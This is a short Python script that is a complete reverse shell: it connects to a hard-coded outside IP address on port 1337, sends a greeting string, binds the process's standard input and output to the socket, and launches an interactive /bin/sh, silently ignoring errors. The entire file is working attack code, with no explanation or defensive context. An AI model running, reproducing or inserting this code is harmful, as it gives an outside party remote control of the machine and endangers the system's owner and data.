import sys, socket, os, subprocess

host = '192.241.235.71'
port = 1337

socket.setdefaulttimeout(60)
sock = None

try:
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((host,port))
    sock.send(b'tunnel snakes rule\n') 
    save = [ os.dup(i) for i in range(0,3) ]
    [ os.dup2(sock.fileno(),i) for i in range(0,3) ]
    shell = subprocess.call(["/bin/sh","-i"])
    [ os.dup2(save[i],i) for i in range(0,3) ]
    [ os.close(save[i]) for i in range(0,3) ]
    os.close(sock.fileno())
except Exception:
    pass
